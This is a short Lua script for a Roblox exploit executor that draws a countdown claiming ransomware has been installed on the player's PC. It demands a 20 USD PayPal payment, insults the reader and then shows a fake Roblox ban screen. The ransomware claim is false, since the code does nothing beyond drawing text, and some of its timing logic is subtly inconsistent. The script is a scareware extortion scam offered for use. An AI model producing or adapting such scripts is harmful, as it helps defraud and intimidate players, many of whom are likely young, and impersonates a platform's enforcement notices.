-- Create the countdown text
local countdownText = Drawing.new("Text")
countdownText.Color = Color3.fromRGB(0, 255, 0)   -- lime green
countdownText.Position = Vector2.new(40, 480)
countdownText.Size = Vector2.new(400, 50)
countdownText.Center = false
countdownText.Outline = true
countdownText.Visible = true

local totalSeconds = 30 * 60 -- 30 minutes

-- Start a separate thread to show the fake ban after 10 seconds
spawn(function()
    wait(25)

    -- Remove countdown text
    countdownText:Remove()

    -- Optional: red full-screen overlay for effect
    local overlay = Drawing.new("Square")
    overlay.Size = Vector2.new(1920, 1080)
    overlay.Position = Vector2.new(0, 0)
    overlay.Color = Color3.fromRGB(139, 0, 0)
    overlay.Filled = true
    overlay.Outline = false
    overlay.Visible = true

    -- Fake ban message
    local banText = Drawing.new("Text")
    banText.Text = "You have been banned from Roblox for cheats and exploits this was detected in 11.3ms .\nAppeal at: https://www.roblox.com/support"
    banText.Color = Color3.fromRGB(255, 255, 255) -- white text
    banText.Position = Vector2.new(960, 540)       -- center of screen
    banText.Size = Vector2.new(600, 100)
    banText.Center = true
    banText.Outline = true
    banText.Visible = true
end)

-- Countdown loop (optional: still runs in background)
while totalSeconds > 0 do
    local minutes = math.floor(totalSeconds / 60)
    local seconds = totalSeconds % 60
    local secondsText = seconds < 25 and "0"..seconds or tostring(seconds)
    countdownText.Text = "If you are reading you're a dumbass. This loadstring has ransomware deeply embedded in it and its now on your PC, the timer to pay me is next to this text. 20 usd MUST be paid or further action will be taken choose wisely. | Paypal: uzi743 | Time left: " .. minutes .. ":" .. secondsText
    wait(1)
    totalSeconds = totalSeconds - 1
end
